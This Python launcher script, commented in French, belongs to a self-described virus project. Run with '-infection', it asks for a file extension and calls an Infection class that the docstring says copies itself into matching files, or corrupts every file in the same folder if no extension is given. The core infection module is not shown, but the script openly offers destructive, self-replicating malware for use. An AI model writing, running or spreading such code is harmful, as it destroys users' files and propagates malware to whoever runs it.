"""ATTENTION A TESTER DANS UN DOSSIER CONTENANT DES FICHIERS INUTILISES !!!!!


Author : Cardin Patson
TEST : python3 main.py -infection
RESULTAT : Se duplique dans les fichiers qui ont l'extension qui a été entré par l'utilisateur
           Si aucune extension n'est entré, Corrompt tous les fichiers qui se trouve au même emplacement que lui
"""


from module.infection import Infection
import sys

if __name__ == "__main__":

    if len(sys.argv) != 2:
        raise Exception("Entrez -h pour voir la liste des options disponible")

    if sys.argv[1] == "-h":
        try:
            with open("./module/help.txt") as help:
                print(help.read())
        except FileNotFoundError:
            print("Fichier help Introuvable")

    elif sys.argv[1] == "-infection":
        extension = input(
            "Entrez l'extension des fichiers (ex : txt , pptx) à corrompre (par défaut tous les fichiers) : ")
        virus = Infection(extension)
        virus.infect()

    else:
        raise Exception(
            "Entrez 'python3 main.py -h' pour voir la liste des options disponibles")
